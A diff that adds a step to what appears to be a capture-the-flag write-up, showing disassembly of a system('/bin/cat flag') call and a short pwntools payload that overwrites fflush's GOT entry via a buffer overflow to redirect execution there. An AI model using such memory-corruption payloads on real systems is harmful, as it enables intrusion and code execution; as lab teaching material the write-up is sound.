@@ -1020,6 +1020,29 @@ Dump of assembler code for function fflush@plt:
    0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a004
 ```
 
+```
+   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+```
+
+We can see system being called at 0x080485ea but we also need the instruction before it to execute.
+
+(The string "/bin/cat flag" starts at 0x80487af)
+
+So we input:
+
+```python
+>>> 0x080485e3
+134514147
+```
+
+```python
+from pwn import p32
+import sys
+payload = b'A'*96 + p32(0x804a004) + b'134514147\n' 
+sys.stdout.buffer.write(payload)
+```
+
 <br>
 
 
